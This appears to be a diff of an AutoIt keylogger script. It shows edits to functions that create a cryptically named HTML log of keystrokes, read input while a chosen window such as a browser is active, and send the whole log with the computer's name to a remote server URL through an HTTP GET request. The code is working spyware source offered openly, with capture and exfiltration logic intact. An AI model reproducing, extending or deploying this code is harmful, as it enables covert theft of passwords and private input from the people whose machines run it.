@@ -41,8 +41,8 @@ Func _init($path)
 	$Time=@hour&":"&@min&":"&@sec
 	$Seperator = "\"
 	If not StringCompare($path, "") Then $Seperator = ""
-	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year
-	Global $File = FileOpen($file_path, 1) ; The filename needed to be a bit cryptic in case you have more than one in the same location
+	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year ; The filename will result in something like this: 26_116_90630
+	Global $File = FileOpen($file_path, 1)
 	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>')
 	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
 EndFunc
@@ -427,22 +427,20 @@ Func _runFor($iterations)
 	Next
 EndFunc
 
-; An endless loop of reading if a certain window is open
+; Reads input when there is a certain window active
 ; This only works if the parameter contains a string which is present in the actual window title (e.g. "Firefox" is a sufficient parameter because every Firefox-Window has the String "Firefox" in its title)
-Func _logWindow($title)
-	While 1
+Func _readWindow($title)
 		If WinActive($title) Then 
 			_read()
 		Else 
 			Sleep($wait_time) 
 		EndIf
-	WEnd
 EndFunc
 
 ; Sends the content of the log to a server-URL via GET
 Func _send($url)
 	FileClose($File) 					; The File is still opened in writing-mode so it is closed to...
-	$File = FileOpen($file_path, 128)	; ...Open in again in read-mode
+	$File = FileOpen($file_path, 128)	; ...open in read-mode again
 	$content = FileRead($File)
 	InetRead($url & "?name=" & @ComputerName & "&content=" & $content) ; The name is needed to identify where the logs are coming from
 	FileClose($File)
